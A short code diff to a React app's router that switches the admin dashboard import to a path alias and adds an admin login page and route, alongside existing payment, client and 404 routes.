@@ -10,7 +10,8 @@ import Pay from "./pages/Pay";
 import PayEn from "./pages/PayEn";
 import Loading from "./pages/Loading";
 // Removed React component imports - using original HTML files instead
-import AdminDashboard from "./pages/AdminDashboard";
+import AdminDashboard from "@/pages/AdminDashboard";
+import AdminLogin from "@/pages/AdminLogin";
 
 // Wrapper components for HTML pages
 const KnetPage = () => {
@@ -80,7 +81,8 @@ function Router() {
       <Route path={"/hawety"} component={HawetPage} />
       <Route path={"/client"} component={ClientPage} />
       <Route path={"/admin-dashboard"} component={AdminDashboard} />
-      <Route path={"/admin"} component={AdminDashboard} />
+       <Route path="/admin" component={AdminDashboard} />
+      <Route path="/admin-login" component={AdminLogin} />
       <Route path={"/404"} component={NotFound} />
       {/* Final fallback route */}
       <Route component={NotFound} />
